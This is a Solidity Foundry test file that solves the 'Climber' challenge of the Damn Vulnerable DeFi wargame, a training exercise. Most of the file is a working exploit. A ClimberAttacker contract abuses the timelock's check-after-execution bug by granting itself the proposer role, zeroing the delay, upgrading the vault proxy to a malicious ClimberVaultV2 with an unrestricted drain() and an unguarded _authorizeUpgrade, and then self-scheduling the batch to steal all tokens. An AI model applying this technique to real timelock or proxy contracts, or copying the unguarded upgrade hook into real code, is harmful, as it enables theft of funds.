// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

// ─────────────────────────────────────────────
// IMPORTS
// ─────────────────────────────────────────────

// Foundry's test framework — provides vm cheatcodes, assertions, and test lifecycle hooks.
import {Test} from "forge-std/Test.sol";

// Contracts under test.
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, PROPOSER_ROLE} from "../../src/climber/ClimberTimelock.sol";

// ERC1967Proxy: OpenZeppelin's standard UUPS/transparent proxy.
// Stores the implementation address in the EIP-1967 designated storage slot.
// Used here to deploy ClimberVault behind a proxy (as it would be in production).
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// The ERC20 token held by the vault — the target asset to be drained.
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Required by ClimberVaultV2 to mirror the upgradeable base contract layout
// and satisfy the UUPS upgrade interface.
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

// ─────────────────────────────────────────────
// TEST CONTRACT
// ─────────────────────────────────────────────

/**
 * @title  ClimberChallenge
 * @notice Foundry test that sets up the Climber challenge environment and
 *         verifies that the player can drain the vault by exploiting the
 *         timelock's checks-after-effects vulnerability.
 *
 * CHALLENGE GOAL
 * Drain all VAULT_TOKEN_BALANCE tokens from ClimberVault to `recovery`.
 *
 * VULNERABILITY RECAP
 * ClimberTimelock.execute() forwards all calls BEFORE checking that the
 * operation is ReadyForExecution. This allows a single transaction to:
 *   1. Grant itself PROPOSER_ROLE (via the timelock).
 *   2. Set delay = 0 (via the timelock).
 *   3. Upgrade the vault to a malicious implementation.
 *   4. Self-schedule the above batch (now valid because delay = 0).
 * By the time the state check runs, the operation IS ready — exploit succeeds.
 *
 * TEST LIFECYCLE
 * setUp()               → deploys proxy vault, timelock, token; funds accounts
 * test_assertInitialState() → sanity-checks the starting conditions
 * test_climber()        → runs the exploit; _isSolved() verifies the outcome
 */
contract ClimberChallenge is Test {

    // ─────────────────────────────────────────
    // ACTORS
    // ─────────────────────────────────────────

    // Foundry `makeAddr` creates deterministic addresses from labels —
    // useful for readable traces and consistent test snapshots.

    address deployer = makeAddr("deployer"); // Deploys proxy + vault; funds token supply
    address player   = makeAddr("player");   // Attacker — must drain the vault
    address proposer = makeAddr("proposer"); // Holds PROPOSER_ROLE in the timelock
    address sweeper  = makeAddr("sweeper");  // Holds sweep privilege in ClimberVault
    address recovery = makeAddr("recovery"); // Destination for drained tokens (win condition)

    // ─────────────────────────────────────────
    // CONSTANTS
    // ─────────────────────────────────────────

    uint256 constant VAULT_TOKEN_BALANCE      = 10_000_000e18; // 10M tokens pre-loaded into vault
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;   // Gas money for the player
    uint256 constant TIMELOCK_DELAY           = 60 * 60;       // 1 hour (3600s) initial delay

    // ─────────────────────────────────────────
    // STATE
    // ─────────────────────────────────────────

    ClimberVault      vault;     // Proxy instance (logic lives in ClimberVault implementation)
    ClimberTimelock   timelock;  // Derived from vault.owner() — the vault's sole governor
    DamnValuableToken token;     // ERC20 asset held by the vault

    // ─────────────────────────────────────────
    // MODIFIERS
    // ─────────────────────────────────────────

    /**
     * @dev Wraps exploit tests with:
     *      1. `vm.startPrank(player, player)` — all calls originate from player
     *         (both msg.sender AND tx.origin set to player).
     *      2. `vm.stopPrank()` — restores caller context.
     *      3. `_isSolved()` — asserts the win condition after the exploit.
     *
     *      Using `player` as tx.origin matters if any contract checks
     *      `tx.origin` for access control (none do here, but it's realistic).
     */
    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // ─────────────────────────────────────────
    // SETUP
    // ─────────────────────────────────────────

    /**
     * @notice Foundry lifecycle hook — runs before every test function.
     *
     * DEPLOYMENT SEQUENCE
     * 1. Deploy ClimberVault implementation (logic contract, no state).
     * 2. Wrap it in ERC1967Proxy, calling initialize(deployer, proposer, sweeper).
     *    - initialize() internally deploys ClimberTimelock and transfers vault ownership to it.
     * 3. Read vault.owner() to get the timelock address.
     * 4. Deploy DamnValuableToken and transfer VAULT_TOKEN_BALANCE to the vault proxy.
     *
     * After setUp():
     * - vault.owner()     == address(timelock)
     * - timelock.delay()  == 1 hour
     * - token balance of vault == VAULT_TOKEN_BALANCE
     * - player has 0.1 ETH
     */
    function setUp() public {
        // startHoax: combines vm.deal(deployer, ...) + vm.startPrank(deployer).
        // All subsequent calls are from `deployer` until vm.stopPrank().
        startHoax(deployer);

        // Give player some ETH for gas (they start with nothing by default).
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the UUPS proxy with ClimberVault as implementation.
        // abi.encodeCall produces the initialize() calldata; the proxy
        // delegatecalls it immediately, setting up roles and timelock.
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()),           // logic contract
                    abi.encodeCall(                        // initialization calldata
                        ClimberVault.initialize,
                        (deployer, proposer, sweeper)
                    )
                )
            )
        );

        // vault.owner() returns address(timelock) — set during initialize().
        // Cast to payable because ClimberTimelock has a receive() fallback.
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and load the vault with the full challenge balance.
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    // ─────────────────────────────────────────
    // SANITY CHECK
    // ─────────────────────────────────────────

    /**
     * @notice Verifies the expected initial state before any exploit runs.
     *         Fails fast if setUp() is broken, keeping exploit test results reliable.
     *
     * ASSERTIONS
     * - player has exactly PLAYER_INITIAL_ETH_BALANCE (no extra ETH).
     * - vault sweeper is correctly set.
     * - last withdrawal timestamp was set during init (non-zero).
     * - vault owner is not zero and not deployer (it's the timelock).
     * - timelock delay is exactly 1 hour.
     * - proposer holds PROPOSER_ROLE in the timelock.
     * - vault holds the full token supply.
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);    // non-zero = initialized
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);               // ownership transferred to timelock

        assertEq(timelock.delay(), TIMELOCK_DELAY);
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    // ─────────────────────────────────────────
    // EXPLOIT TEST
    // ─────────────────────────────────────────

    /**
     * @notice Entry point for the Climber exploit.
     *         Wrapped by `checkSolvedByPlayer` — runs as `player`, then
     *         asserts the win condition via `_isSolved()`.
     *
     * EXPLOIT SUMMARY (single transaction)
     * 1. Deploy ClimberVaultV2 (malicious implementation).
     * 2. Deploy ClimberAttacker with references to timelock, vault, token, recovery.
     * 3. Call attacker.attack() — see ClimberAttacker for the full breakdown.
     */
    function test_climber() public checkSolvedByPlayer {
        ClimberAttacker attacker = new ClimberAttacker(
            timelock,
            vault,
            token,
            recovery
        );

        attacker.attack();
    }

    // ─────────────────────────────────────────
    // WIN CONDITION
    // ─────────────────────────────────────────

    /**
     * @dev Called automatically after test_climber() by checkSolvedByPlayer.
     *      The challenge is solved iff:
     *      - The vault holds exactly 0 tokens (fully drained).
     *      - The recovery address holds exactly VAULT_TOKEN_BALANCE tokens.
     *
     *      Both assertions are needed — transferring tokens to the wrong
     *      address would pass the first but fail the second.
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE);
    }
}

// ─────────────────────────────────────────────
// ATTACK CONTRACT
// ─────────────────────────────────────────────

/**
 * @title  ClimberAttacker
 * @notice Orchestrates the full exploit in a single transaction by abusing
 *         ClimberTimelock's checks-after-effects bug.
 *
 * EXPLOIT FLOW — all within one timelock.execute() call
 *
 *  timelock.execute([call0, call1, call2, call3], salt=0)
 *      │
 *      ├─ call0: timelock.grantRole(PROPOSER_ROLE, address(this))
 *      │         → this contract can now call timelock.schedule()
 *      │
 *      ├─ call1: timelock.updateDelay(0)
 *      │         → delay becomes 0; any future schedule() is immediately executable
 *      │
 *      ├─ call2: vault.upgradeToAndCall(ClimberVaultV2, "")
 *      │         → vault's logic is swapped to the malicious implementation
 *      │
 *      ├─ call3: this.schedule()
 *      │         → schedules THIS EXACT batch (same targets/values/data/salt)
 *      │           readyAtTimestamp = block.timestamp + 0 = block.timestamp
 *      │           operation is immediately ReadyForExecution
 *      │
 *      └─ [state check] getOperationState(id) == ReadyForExecution ✓
 *                        → operations[id].executed = true
 *
 *  After execute() returns:
 *      vault is now ClimberVaultV2 → call drain() to transfer all tokens to recovery
 *
 * KEY INSIGHT
 * The batch self-schedules itself (call3) DURING execution.
 * Because delay = 0 (set by call1), the operation is immediately ready.
 * The state check at the end of execute() sees ReadyForExecution and passes.
 * The exploit is entirely self-contained — no waiting, no second transaction.
 */
contract ClimberAttacker {

    // ─────────────────────────────────────────
    // STATE
    // ─────────────────────────────────────────

    ClimberTimelock   timelock;   // Timelock to exploit
    ClimberVault      vault;      // Vault proxy to upgrade
    DamnValuableToken token;      // Token to drain
    address           recovery;   // Destination for drained funds

    // Batch arrays stored as state so `schedule()` can read them
    // without needing parameters (called via low-level ABI encoding).
    address[] targets;
    uint256[] values;
    bytes[]   data;

    // ─────────────────────────────────────────
    // CONSTRUCTOR
    // ─────────────────────────────────────────

    constructor(
        ClimberTimelock _timelock,
        ClimberVault    _vault,
        DamnValuableToken _token,
        address         _recovery
    ) {
        timelock = _timelock;
        vault    = _vault;
        token    = _token;
        recovery = _recovery;
    }

    // ─────────────────────────────────────────
    // EXPLOIT ENTRY POINT
    // ─────────────────────────────────────────

    /**
     * @notice Executes the full exploit in one transaction.
     *         Must be called by the player (or any EOA/contract).
     *
     * STEP-BY-STEP
     *
     * Step 1 — Deploy malicious vault implementation.
     *   ClimberVaultV2 has no access controls on drain() — anyone can call it.
     *   Storage layout mirrors ClimberVault to avoid slot collisions on upgrade.
     *
     * Steps 2–5 — Build the 4-call batch.
     *   Stored in contract state so schedule() (call3) can reference them.
     *
     * Step 6 — Trigger execute().
     *   execute() forwards all 4 calls before checking operation state.
     *   By the time the check runs, call3 has already self-scheduled the batch
     *   with delay=0, making it immediately ReadyForExecution.
     *
     * Step 7 — Drain the upgraded vault.
     *   The proxy now delegates to ClimberVaultV2; drain() moves all tokens.
     */
    function attack() external {

        // Step 1: Deploy the malicious vault implementation.
        // ClimberVaultV2 exposes an unrestricted drain() function.
        ClimberVaultV2 newImpl = new ClimberVaultV2();

        // Allocate batch arrays (4 calls).
        targets = new address[](4);
        values  = new uint256[](4);
        data    = new bytes[](4);

        // ── Call 0: Grant PROPOSER_ROLE to this contract ──────────────────
        // Needed so that call3 (this.schedule()) is accepted by the timelock.
        // Without this, schedule() would revert with AccessControl error.
        targets[0] = address(timelock);
        values[0]  = 0;
        data[0]    = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)   // this contract becomes a proposer
        );

        // ── Call 1: Set timelock delay to 0 ───────────────────────────────
        // With delay=0, any schedule() call produces readyAtTimestamp = now.
        // This makes the self-scheduled batch immediately ReadyForExecution.
        // updateDelay() requires msg.sender == address(timelock), which is
        // satisfied because execute() delegatecalls... actually it uses
        // functionCallWithValue, so msg.sender IS the timelock. ✓
        targets[1] = address(timelock);
        values[1]  = 0;
        data[1]    = abi.encodeWithSignature(
            "updateDelay(uint64)",
            uint64(0)
        );

        // ── Call 2: Upgrade vault to malicious implementation ─────────────
        // upgradeToAndCall() is an OZ UUPS function on the proxy.
        // It checks _authorizeUpgrade() — which requires onlyOwner (timelock).
        // Since the timelock is making this call (via execute()), it passes. ✓
        // Empty bytes("") means no initializer is called on the new implementation.
        targets[2] = address(vault);
        values[2]  = 0;
        data[2]    = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(newImpl),
            bytes("")
        );

        // ── Call 3: Self-schedule this batch ──────────────────────────────
        // Calls this.schedule(), which calls timelock.schedule(targets, values, data, 0).
        // At this point (inside execute()):
        //   - This contract has PROPOSER_ROLE (granted by call0). ✓
        //   - delay == 0 (set by call1). ✓
        //   - readyAtTimestamp = block.timestamp + 0 = block.timestamp. ✓
        //   - Operation state becomes ReadyForExecution immediately. ✓
        // The timelock's subsequent state check therefore passes.
        targets[3] = address(this);
        values[3]  = 0;
        data[3]    = abi.encodeWithSignature("schedule()");

        // Step 6: Trigger execute().
        // Internally: forwards call0 → call1 → call2 → call3 → checks state → marks executed.
        // salt = bytes32(0) — arbitrary, must match what schedule() uses (it does).
        timelock.execute(targets, values, data, bytes32(0));

        // Step 7: Drain the vault.
        // The proxy now points to ClimberVaultV2. drain() has no access control —
        // any caller can invoke it. Sends entire token balance to `recovery`.
        ClimberVaultV2(address(vault)).drain(address(token), recovery);
    }

    // ─────────────────────────────────────────
    // CALLBACK — invoked as call3 inside execute()
    // ─────────────────────────────────────────

    /**
     * @notice Schedules the batch that is currently being executed.
     *         This is the self-referential trick at the heart of the exploit.
     *
     * CALLED BY: timelock.execute() → functionCallWithValue(data[3], 0)
     *            → this.schedule()
     *
     * WHY THIS WORKS:
     * - This contract now has PROPOSER_ROLE (granted by call0 earlier in the batch).
     * - delay is now 0 (set by call1 earlier in the batch).
     * - Scheduling with delay=0 → readyAtTimestamp = block.timestamp.
     * - block.timestamp < readyAtTimestamp is false immediately → ReadyForExecution.
     * - When execute()'s state check runs after this call, the batch IS ready. ✓
     *
     * @dev Uses the same salt (bytes32(0)) as execute() to produce the same ID.
     *      The batch arrays are read from contract state — set in attack() before
     *      execute() was called, so they are fully populated when this runs.
     */
    function schedule() external {
        timelock.schedule(targets, values, data, bytes32(0));
    }
}

// ─────────────────────────────────────────────
// MALICIOUS VAULT IMPLEMENTATION
// ─────────────────────────────────────────────

/**
 * @title  ClimberVaultV2
 * @notice Malicious UUPS implementation that replaces ClimberVault via the exploit.
 *         Exposes an unrestricted drain() function — no roles, no limits, no timelock.
 *
 * STORAGE LAYOUT — CRITICAL
 * UUPS upgrades preserve proxy storage. The implementation's storage variables
 * are overlaid on the proxy's existing slots. If the layout differs, reads/writes
 * in the new implementation corrupt existing data (e.g., _owner slot).
 *
 * ClimberVault slot layout (after OZ upgradeable base slots):
 *   slot N+0: _lastWithdrawalTimestamp (uint256)
 *   slot N+1: _sweeper (address)
 *
 * ClimberVaultV2 mirrors this exactly — both variables declared in the same order.
 * The OZ upgradeable base slots (Initializable, OwnableUpgradeable, etc.) are
 * inherited and preserved automatically.
 *
 * ⚠️ If _sweeper or _lastWithdrawalTimestamp were reordered or omitted here,
 *    reading `owner()` or other inherited state could return garbage values.
 *
 * @dev Inherits Initializable, OwnableUpgradeable, UUPSUpgradeable purely to
 *      satisfy the UUPS upgrade interface (_authorizeUpgrade must exist).
 *      No initializer is called on upgrade (empty bytes in upgradeToAndCall).
 */
contract ClimberVaultV2 is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    // ── Storage layout mirror (must match ClimberVault exactly) ──────────
    // These variables are never written by ClimberVaultV2 — they exist only
    // to hold the correct slot positions so inherited state isn't corrupted.
    uint256 private _lastWithdrawalTimestamp; // slot mirror — do not reorder
    address private _sweeper;                 // slot mirror — do not reorder

    // ─────────────────────────────────────────
    // EXPLOIT FUNCTION
    // ─────────────────────────────────────────

    /**
     * @notice Transfers the vault's entire token balance to an arbitrary receiver.
     *
     * @param token    ERC20 token address to drain (DVT in this challenge).
     * @param receiver Destination address — the `recovery` address in the test.
     *
     * ACCESS CONTROL: NONE.
     * Unlike ClimberVault.sweepFunds() (which requires onlySweeper) or
     * ClimberVault.withdraw() (which requires onlyOwner + rate limits),
     * this function has zero restrictions — any caller, any time, full balance.
     *
     * @dev Uses raw IERC20.transfer() rather than SafeTransferLib.
     *      Sufficient here since DVT is a standard compliant ERC20.
     *      balanceOf is evaluated at call time — captures the full proxy balance.
     */
    function drain(address token, address receiver) external {
        IERC20(token).transfer(
            receiver,
            IERC20(token).balanceOf(address(this)) // full proxy token balance
        );
    }

    // ─────────────────────────────────────────
    // UUPS REQUIREMENT
    // ─────────────────────────────────────────

    /**
     * @dev Satisfies the UUPSUpgradeable interface requirement.
     *      Intentionally empty — no access control on further upgrades.
     *      In a real malicious implementation this would allow the attacker
     *      to upgrade again freely; here it's irrelevant since drain() is the goal.
     *
     * ⚠️ In any legitimate contract, this MUST be guarded (e.g., onlyOwner).
     *    Leaving it empty means anyone can upgrade the implementation again.
     */
    function _authorizeUpgrade(address) internal override {}
}
